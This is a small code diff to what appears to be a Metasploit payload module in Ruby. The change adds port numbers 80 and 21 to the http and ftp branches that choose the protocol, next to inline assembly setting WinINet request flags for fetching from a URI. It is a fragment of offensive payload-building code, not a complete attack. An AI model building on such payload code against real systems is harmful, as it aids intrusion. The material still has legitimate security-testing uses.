@@ -94,10 +94,12 @@ module Metasploit3
 			# get desired protocol
 			if target_uri.start_with?'http://'
 				proto = "http"
+				port_nr = 80
 				dwflags_asm = "push (0x80000000 | 0x04000000 | 0x00200000 |0x00001000 |0x00002000 |0x00000200) ; dwFlags\n"
 			end
 			if target_uri.start_with?'ftp://'
 				proto = "ftp"
+				port_nr = 21
 				dwflags_asm = "push (0x80000000 | 0x04000000 | 0x00200000 |0x00001000 |0x00002000 |0x00000200) ; dwFlags\n"
 			end
 
